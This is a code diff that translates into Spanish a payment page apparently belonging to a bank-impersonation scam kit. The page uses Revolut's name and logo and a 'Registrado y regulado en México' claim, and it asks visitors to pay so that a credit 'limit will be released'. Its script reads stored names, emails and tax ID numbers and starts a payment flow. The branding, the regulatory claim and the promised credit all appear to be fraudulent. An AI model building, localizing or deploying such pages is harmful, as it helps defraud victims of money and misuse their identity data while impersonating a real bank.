@@ -145,7 +145,7 @@ window.apiUrl = window.apiUrl || function (p) {
     </div>
     <div class="user-block">
       <div class="user-info">
-        <div class="name" id="userName">customer</div>
+        <div class="name" id="userName">cliente</div>
         <div class="nif" id="userNif">*** *** ***</div>
       </div>
       <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -174,12 +174,12 @@ window.apiUrl = window.apiUrl || function (p) {
 
   <!-- Button -->
   <div style="padding:18px 16px 0;">
-    <button class="btn-pay" onclick="abrirModal()"><span data-msg="upsell3.t08">Make payment</span></button>
+    <button class="btn-pay" onclick="abrirModal()"><span data-msg="upsell3.t08">Realizar pago</span></button>
   </div>
 
   <!-- Security -->
   <div style="text-align:center;padding:12px 0 4px;color:#71717a;font-size:12px;">
-    🔒 Secure environment and protected data
+    🔒 Entorno seguro y datos protegidos
   </div>
 
   <!-- Description -->
@@ -189,7 +189,7 @@ window.apiUrl = window.apiUrl || function (p) {
 
   <!-- Footer text -->
   <div style="text-align:center;padding:18px 20px 28px;color:#71717a;font-size:12px;line-height:1.6;">
-    After payment confirmation, your limit will be released and the credit will be available in your RevolutBank account.
+    After payment confirmation, your limit will be released and the credit will be available in your Cuenta RevolutBank.
   </div>
 
 
@@ -197,7 +197,7 @@ window.apiUrl = window.apiUrl || function (p) {
   <div class="modal-overlay" id="payModal">
     <div class="modal-sheet">
       <button class="modal-close" onclick="closeModal()"><span data-msg="upsell3.t12">×</span></button>
-      <div class="modal-title">Confirmar Payment</div>
+      <div class="modal-title">Confirmar pago</div>
       <div class="modal-amount" id="modalPayAmount">$ ---</div>
       <div id="modalBody"></div>
     </div>
@@ -208,7 +208,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <div class="logo-wrap">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="Revolut"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">Revolut</text></svg>
     </div>
-    Revolut<br/>Registered and regulated within the México
+    Revolut<br/>Registrado y regulado en México
   </div>
 
 </div>
@@ -302,7 +302,7 @@ function startPolling(txId){
 
 async function startPayment(phone){
   console.log('[UPSELL] startPayment phone:', phone);
-  const nome=localStorage.getItem("nome")||"Customer";
+  const nome=localStorage.getItem("nome")||"Cliente";
   const email=localStorage.getItem("email")||"customer@revolutbank.com";
   const doc=(localStorage.getItem("nif")||localStorage.getItem("cpf")||"999999999").replace(/\D/g,"")||"999999999";
   setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
